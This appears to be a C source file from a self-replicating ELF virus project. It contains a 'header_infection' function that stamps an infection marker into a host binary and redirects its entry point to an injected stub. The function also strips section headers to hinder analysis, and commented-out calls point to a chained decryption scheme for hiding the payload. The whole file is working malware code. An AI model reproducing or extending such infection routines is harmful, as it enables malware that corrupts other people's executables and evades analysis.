#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_left(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

#if LOGGER
	MID_LOGGER("header_infection:\t");
#endif

	if (context == FAILURE)
		goto label;

	const size_t stub_size = (void *)__exit - (void *)L1;

	*(unsigned int *)&host->header->e_ident[EI_PAD] = PWN_MAGIC_NUMBER;

	host->entry[OLD] = host->header->e_entry;
	host->header->e_entry = (host->segment[TEXT]->p_vaddr + host->segment[TEXT]->p_memsz) - stub_size;
	host->entry[NEW] = host->header->e_entry;

	host->header->e_shoff = 0;
	host->header->e_shnum = 0;
	host->header->e_shstrndx = 0;

label:
//	update_keychain_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
//	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

	injection(host, keychain, context);
}
